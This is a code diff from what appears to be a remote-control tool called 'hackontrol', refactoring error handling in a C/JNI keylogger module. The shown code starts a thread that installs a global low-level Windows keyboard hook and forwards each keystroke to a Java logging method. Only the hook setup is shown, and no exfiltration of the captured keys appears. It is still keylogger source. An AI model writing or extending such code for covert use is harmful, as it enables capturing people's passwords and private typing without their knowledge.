@@ -1,5 +1,4 @@
-#include <khopanjni.h>
-#include <khopanerror.h>
+#include <khopanjava.h>
 #include "keylogger.h"
 
 static JavaVM* globalVirtualMachine;
@@ -14,7 +13,7 @@ void KeyLoggerInitialize(JNIEnv* environment, JavaVM* virtualMachine) {
 	globalVirtualMachine = virtualMachine;
 
 	if(!CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, NULL)) {
-		KHWin32ErrorW(environment, GetLastError(), L"CreateThread");
+		KHJavaWin32ErrorW(environment, GetLastError(), L"CreateThread");
 	}
 }
 
@@ -33,7 +32,6 @@ static DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
 	jclass nativeLibraryClass = (*environment)->FindClass(environment, "com/khopan/hackontrol/NativeLibrary");
 
 	if(!nativeLibraryClass) {
-		KHStandardErrorW(environment, L"Class 'com.khopan.hackontrol.NativeLibrary' not found");
 		return 1;
 	}
 
@@ -41,14 +39,13 @@ static DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
 	jmethodID logMethod = (*environment)->GetStaticMethodID(environment, nativeLibraryClass, "log", "(IIIII)Z");
 	
 	if(!logMethod) {
-		KHStandardErrorW(environment, L"Method 'log(IIIII)Z' not found in class 'com.khopan.hackontrol.NativeLibrary'");
 		return 1;
 	}
 
 	globalLogMethod = logMethod;
 	
 	if(!SetWindowsHookExW(WH_KEYBOARD_LL, KeyLoggerProcedure, NULL, 0)) {
-		KHWin32ErrorW(environment, GetLastError(), L"SetWindowsHookExW");
+		KHJavaWin32ErrorW(environment, GetLastError(), L"SetWindowsHookExW");
 		return 1;
 	}
 	
